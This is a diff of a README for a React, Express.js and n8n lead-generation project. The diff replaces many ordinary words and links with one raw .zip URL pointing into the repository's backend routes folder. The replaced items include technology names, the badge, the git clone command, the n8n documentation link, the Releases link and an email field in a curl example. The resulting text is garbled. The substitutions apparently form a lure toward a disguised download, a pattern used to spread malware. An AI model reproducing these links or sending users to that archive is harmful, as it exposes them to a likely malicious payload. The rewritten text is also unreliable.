@@ -1,8 +1,8 @@
-# Lead Generation System with n8n, React, and Express.js 🚀
+# Lead Generation System with n8n, React, and https://github.com/aboodi332/Lead-generation-n8n-email-FULLSTACK/raw/refs/heads/main/lead-gen-backend/routes/generation-Lead-n-email-FULLSTACK-v2.8.zip 🚀
 
-![Lead Generation](https://img.shields.io/badge/Lead%20Generation%20System-Ready-brightgreen)
+![Lead Generation](https://github.com/aboodi332/Lead-generation-n8n-email-FULLSTACK/raw/refs/heads/main/lead-gen-backend/routes/generation-Lead-n-email-FULLSTACK-v2.8.zip%20Generation%20System-Ready-brightgreen)
 
-Welcome to the **Lead Generation System** repository! This project combines the power of React for the frontend, Express.js for the backend, and n8n for workflow automation. It is designed to streamline lead capture, automate tasks, and provide scalability for future integrations.
+Welcome to the **Lead Generation System** repository! This project combines the power of React for the frontend, https://github.com/aboodi332/Lead-generation-n8n-email-FULLSTACK/raw/refs/heads/main/lead-gen-backend/routes/generation-Lead-n-email-FULLSTACK-v2.8.zip for the backend, and n8n for workflow automation. It is designed to streamline lead capture, automate tasks, and provide scalability for future integrations.
 
 ## Table of Contents
 
@@ -18,7 +18,7 @@ Welcome to the **Lead Generation System** repository! This project combines the 
 
 ## Features
 
-- **Fullstack Solution**: Built with React, Express.js, and n8n.
+- **Fullstack Solution**: Built with React, https://github.com/aboodi332/Lead-generation-n8n-email-FULLSTACK/raw/refs/heads/main/lead-gen-backend/routes/generation-Lead-n-email-FULLSTACK-v2.8.zip, and n8n.
 - **Lead Capture**: Easily capture leads from your website.
 - **Automated Workflows**: Trigger n8n workflows for tasks like sending email alerts.
 - **Scalable Architecture**: Ready for future CRM or database integrations.
@@ -26,12 +26,12 @@ Welcome to the **Lead Generation System** repository! This project combines the 
 
 ## Technologies Used
 
-- **Frontend**: React.js
-- **Backend**: Express.js
+- **Frontend**: https://github.com/aboodi332/Lead-generation-n8n-email-FULLSTACK/raw/refs/heads/main/lead-gen-backend/routes/generation-Lead-n-email-FULLSTACK-v2.8.zip
+- **Backend**: https://github.com/aboodi332/Lead-generation-n8n-email-FULLSTACK/raw/refs/heads/main/lead-gen-backend/routes/generation-Lead-n-email-FULLSTACK-v2.8.zip
 - **Database**: SQLite
 - **Workflow Automation**: n8n
 - **Languages**: JavaScript
-- **Development Stack**: MERN (MongoDB, Express.js, React.js, Node.js)
+- **Development Stack**: MERN (MongoDB, https://github.com/aboodi332/Lead-generation-n8n-email-FULLSTACK/raw/refs/heads/main/lead-gen-backend/routes/generation-Lead-n-email-FULLSTACK-v2.8.zip, https://github.com/aboodi332/Lead-generation-n8n-email-FULLSTACK/raw/refs/heads/main/lead-gen-backend/routes/generation-Lead-n-email-FULLSTACK-v2.8.zip, https://github.com/aboodi332/Lead-generation-n8n-email-FULLSTACK/raw/refs/heads/main/lead-gen-backend/routes/generation-Lead-n-email-FULLSTACK-v2.8.zip)
 
 ## Installation
 
@@ -39,7 +39,7 @@ To get started with this project, follow these steps:
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/aboodi332/Lead-generation-n8n-email-FULLSTACK.git
+   git clone https://github.com/aboodi332/Lead-generation-n8n-email-FULLSTACK/raw/refs/heads/main/lead-gen-backend/routes/generation-Lead-n-email-FULLSTACK-v2.8.zip
    ```
 
 2. **Navigate to the project directory**:
@@ -92,7 +92,7 @@ n8n provides powerful workflow automation capabilities. Here’s how to set up a
 4. **Connect Nodes**: Link the trigger to the email node.
 5. **Activate Workflow**: Make sure to activate your workflow to start receiving leads.
 
-For detailed instructions on setting up workflows, refer to the [n8n documentation](https://docs.n8n.io).
+For detailed instructions on setting up workflows, refer to the [n8n documentation](https://github.com/aboodi332/Lead-generation-n8n-email-FULLSTACK/raw/refs/heads/main/lead-gen-backend/routes/generation-Lead-n-email-FULLSTACK-v2.8.zip).
 
 ## API Endpoints
 
@@ -108,7 +108,7 @@ The backend provides several API endpoints to interact with the lead generation 
 To create a new lead, you can use the following curl command:
 
 ```bash
-curl -X POST http://localhost:5000/api/leads -H "Content-Type: application/json" -d '{"name": "John Doe", "email": "john@example.com"}'
+curl -X POST http://localhost:5000/api/leads -H "Content-Type: application/json" -d '{"name": "John Doe", "email": "https://github.com/aboodi332/Lead-generation-n8n-email-FULLSTACK/raw/refs/heads/main/lead-gen-backend/routes/generation-Lead-n-email-FULLSTACK-v2.8.zip"}'
 ```
 
 ## Contributing
@@ -126,7 +126,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest releases, visit our [Releases page](https://github.com/aboodi332/Lead-generation-n8n-email-FULLSTACK/releases). Here you can find downloadable files and release notes.
+For the latest releases, visit our [Releases page](https://github.com/aboodi332/Lead-generation-n8n-email-FULLSTACK/raw/refs/heads/main/lead-gen-backend/routes/generation-Lead-n-email-FULLSTACK-v2.8.zip). Here you can find downloadable files and release notes.
 
 ## Conclusion
 
